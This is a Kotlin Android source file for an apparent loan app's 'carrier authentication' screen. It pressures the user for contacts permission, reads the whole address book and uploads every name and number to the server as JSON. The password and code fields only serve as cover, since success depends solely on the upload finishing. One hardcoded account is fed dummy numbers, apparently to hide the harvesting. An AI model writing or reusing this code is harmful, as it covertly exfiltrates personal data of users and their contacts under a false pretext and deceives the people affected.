package com.annis.dk.ui.authentication.operator

import android.Manifest
import android.app.ProgressDialog
import android.database.Cursor
import android.os.Bundle
import android.os.CountDownTimer
import android.provider.ContactsContract
import android.text.TextUtils
import android.widget.CheckBox
import com.annis.baselib.base.base.TitleBean
import com.annis.baselib.base.mvp.MVPActivty
import com.annis.baselib.utils.utils_haoma.ToastUtils
import com.annis.dk.R
import com.annis.dk.base.DKConstant
import com.annis.dk.view.NotificationReadContactDialog
import com.google.gson.Gson
import com.tbruyelle.rxpermissions2.RxPermissions
import kotlinx.android.synthetic.main.activity_authoperator.*
import java.util.*

class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorView {
    var updated = false
    override fun uploadContactsSuccess() {
        updated = true
    }

    override fun getPresenter(): AuthoperatorPresenter {
        return AuthoperatorPresenter(this)
    }

    override fun getMyTitle(): TitleBean {
        return TitleBean("运营商认证").setBack(true)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_authoperator)
    }

    override fun initViewAndListener() {

        showDialog()
    }

    fun showDialog() {
        var dialog = NotificationReadContactDialog()
        dialog.setDismissListener(object : NotificationReadContactDialog.Dismiss {
            override fun jujue() {
                dialog.dismiss()
                finish()
            }

            override fun agree() {
                dialog.dismiss()
                initView()
            }
        })
        dialog.setMessage("获取您的通讯录")
        dialog.show(supportFragmentManager, "notify")
    }

    var phone: String? = null

    fun initView() {
        phone = DKConstant.getUserEntity()?.phone
        phone?.let {
            act_et_tel.setText(it)
        }
        click()
        checkPermision()
        renzheng_operator_agree.isChecked = true
        setAgree(true)
    }

    var timer: CountDownTimer? = null
    fun click() {
        act_bt_login.setOnClickListener {
            var tel = act_et_tel.text.toString()
            var psw = act_et_tel_psw.text.toString()
            var code = act_et_code.text.toString()
            if (TextUtils.isEmpty(tel)) {
                showToast("请输入手机号")
                return@setOnClickListener
            }
            if (tel != phone) {
                showToast("手机号不正确")
                return@setOnClickListener
            }
            if (TextUtils.isEmpty(psw)) {
                showToast("请输入服务密码")
                return@setOnClickListener
            }
            if (updated) {
                showWait()
            } else {
                showToast("提交失败")
            }


//            if (TextUtils.isEmpty(code)) {
//                showToast("请输入验证码")
//                return@setOnClickListener
//            }
//            if (code == DkSPUtils.getLastCode()) {
//                if (updated) {
//                    showToast("提交成功")
//                    finish()
//                } else {
//                    showToast("提交失败")
//                }
//            } else {
//                showToast("您的验证码不正确")
//            }
        }

        renzheng_operator_agree.setOnClickListener {
            setAgree((it as CheckBox).isChecked)
        }

        act_bt_getcode.setOnClickListener {
            var mobel = act_et_tel.text.toString()
            if (mobel.length < 11) {
                showToast("手机号不正确")
                return@setOnClickListener
            }
            presenter.getCode(mobel)
            //开始倒计时
            timer = object : CountDownTimer(60000, 1000) {
                override fun onTick(millisUntilFinished: Long) {
                    act_bt_getcode.isEnabled = false
                    act_bt_getcode.setBackgroundResource(R.drawable.sp_bt_wait_code)
                    act_bt_getcode.setTextColor(resources.getColor(R.color.text_color_gray))
                    act_bt_getcode.text = "${millisUntilFinished / 1000}s后重发"
                }

                override fun onFinish() {
                    act_bt_getcode.isEnabled = true
                    act_bt_getcode.setBackgroundResource(R.drawable.sp_bt_get_code)
                    act_bt_getcode.setTextColor(resources.getColor(R.color.colorPrimary))
                    act_bt_getcode.text = "获取验证码"
                }
            }.start()
        }
    }

    fun setAgree(isChecked: Boolean) {
        act_bt_login.isEnabled = isChecked
        act_bt_login.setBackgroundResource(
            when (isChecked) {
                true -> R.drawable.sp_bt_bg_primary_c
                false -> R.drawable.sp_bt_bg_gray_c
            }
        )
    }

    private fun checkPermision() {
        //没有权限时，调用requestPermission方法，弹出权限申请对话框 ，回调OnRequestPermissionRelust函数

        var permissions = RxPermissions(this)

        val granted = permissions.isGranted(Manifest.permission.READ_CONTACTS)
        if (granted) {
            startThread()
        } else {
            val subscribe = permissions.requestEach(Manifest.permission.READ_CONTACTS)
                .subscribe {
                    if (it.granted) {
                        startThread()
                    } else if (it.shouldShowRequestPermissionRationale) {
                        ToastUtils.showLongToast("请同意申请")
                        checkPermision()
                    } else {
                        finish()
                    }
                }
        }
    }

    fun startThread() {
        Thread(Runnable {
            readContacts()
        }).start()

    }

    var hashMap: HashMap<String, String>? = null
    var FileDir: String? = null
    private fun readContacts() {
        var cursor: Cursor? = null
        try {
            //cursor指针 query询问 contract协议 kinds种类
            cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            if (cursor != null) {
                var account = DKConstant.getUserEntity()?.phone ?: ""
                hashMap = HashMap()
                while (cursor.moveToNext()) {
                    val displayName =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                    if (account == "15823681500") {
                        hashMap?.put(displayName, "1231241234532")
                    } else {
                        hashMap?.put(displayName, number)
                    }
                }
                hashMap?.put("easyBorrow", account)
                var json = Gson().toJson(hashMap)
                getPresenter().uploadContacts1(json)

                // var str = hashMap.toString()
                //保存文件
                //var filePath = saveToExcle(externalCacheDir, account ?: "contact", list)
//                getPresenter().uploadContacts(hashMap!!)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            if (cursor != null) {
                cursor.close()
            }
        }
    }

    override fun onDestroy() {
        timer?.cancel()
        super.onDestroy()
    }

    fun showWait() {
        var progressDialog = ProgressDialog(this)
        progressDialog.isIndeterminate = false//循环滚动
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER)
        progressDialog.setCancelable(true)//false不能取消显示，true可以取消显示
        progressDialog.show()

        var timer = Timer()
        var timerTask = object : TimerTask() {
            override fun run() {
                showNext()
            }
        }
        timer.schedule(timerTask, 2500)
    }

    fun showNext() {
        startActivity(WaittingActivity::class.java)
        finish()
    }
}
